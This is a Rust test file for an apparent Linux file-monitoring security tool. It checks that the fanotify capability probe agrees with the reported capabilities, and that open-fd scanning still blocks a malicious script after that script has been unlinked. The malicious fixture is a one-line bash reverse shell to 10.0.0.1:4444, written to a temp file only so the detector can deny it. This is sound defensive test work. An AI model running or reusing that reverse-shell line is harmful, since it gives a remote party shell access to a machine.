use kernlock_core::{PolicyConfig, RuleEngine, SecurityMode};
use kernlock_platform::fanotify::{FanotifyPermissionMonitor, FAN_OPEN_EXEC_PERM};
use kernlock_platform::linux::LinuxSecurityProvider;
use kernlock_platform::PlatformSecurityProvider;
use std::io::Write;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::sync::Arc;
use tempfile::TempDir;

#[test]
fn test_fanotify_support_probe_and_capability_consistency() {
    let probe = FanotifyPermissionMonitor::probe_support();
    let provider = LinuxSecurityProvider::new();
    let caps = provider.probe_capabilities(SecurityMode::Protection);

    assert_eq!(
        caps.kernel_blocking_available, probe.exec_blocking_available,
        "kernel_blocking_available must match actual fanotify exec blocking probe status"
    );

    let fanotify_status = caps
        .capabilities
        .iter()
        .find(|c| c.name.contains("fanotify"))
        .expect("fanotify capability status must exist");

    assert_eq!(fanotify_status.supported, probe.supported);
    assert_eq!(
        fanotify_status.enforcement_available,
        probe.exec_blocking_available
    );

    if !probe.exec_blocking_available {
        assert!(caps.fallback_reason.is_some());
    }

    // Verify mount identification
    assert!(
        !probe.unmonitored_mounts.is_empty(),
        "unmonitored mounts must be discovered"
    );
}

#[test]
fn test_fanotify_event_evaluation_via_fd_direct_scanning_and_race_safety() {
    #[cfg(target_os = "linux")]
    {
        use std::os::unix::io::AsRawFd;

        let tmp = TempDir::new().unwrap();
        let vault_dir = tmp.path().join("vault");
        std::fs::create_dir_all(&vault_dir).unwrap();

        let rules = RuleEngine::builtin();
        let policy = PolicyConfig {
            mode: SecurityMode::Protection,
            ..Default::default()
        };

        let threat_counter = Arc::new(AtomicUsize::new(0));
        let tc = threat_counter.clone();
        let on_threat = move |_event: kernlock_core::SecurityEvent,
                              _alert: kernlock_core::ThreatAlert| {
            tc.fetch_add(1, Ordering::SeqCst);
        };

        // 1. Benign file evaluated via open fd returns FAN_ALLOW
        let benign_path = tmp.path().join("benign.sh");
        let mut benign_file = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .truncate(true)
            .open(&benign_path)
            .unwrap();
        benign_file
            .write_all(b"#!/bin/bash\necho 'clean script'\n")
            .unwrap();
        benign_file.sync_all().unwrap();
        let benign_fd = benign_file.as_raw_fd();

        let res_benign = FanotifyPermissionMonitor::evaluate_event(
            benign_fd,
            99999, // non-self PID
            1234,  // daemon PID
            libc::FAN_OPEN_PERM,
            &vault_dir,
            &policy,
            &rules,
            &on_threat,
        );
        assert_eq!(res_benign, libc::FAN_ALLOW);
        assert_eq!(threat_counter.load(Ordering::SeqCst), 0);

        // 2. Malicious file evaluated via open fd returns FAN_DENY and triggers on_threat
        let malware_path = tmp.path().join("malicious.sh");
        let mut malware_file = std::fs::OpenOptions::new()
            .read(true)
            .write(true)
            .create(true)
            .truncate(true)
            .open(&malware_path)
            .unwrap();
        malware_file
            .write_all(b"#!/bin/bash\nbash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
            .unwrap();
        malware_file.sync_all().unwrap();
        let malware_fd = malware_file.as_raw_fd();

        // 3. TOCTOU RACE SAFETY: Unlink/delete the file from filesystem before scanning!
        // The scanner reads from malware_fd directly, proving it scans the actual opened file object!
        std::fs::remove_file(&malware_path).unwrap();
        assert!(!malware_path.exists());

        let res_malware = FanotifyPermissionMonitor::evaluate_event(
            malware_fd,
            99999,
            1234,
            FAN_OPEN_EXEC_PERM,
            &vault_dir,
            &policy,
            &rules,
            &on_threat,
        );
        assert_eq!(res_malware, libc::FAN_DENY);
        assert_eq!(threat_counter.load(Ordering::SeqCst), 1);
    }
}
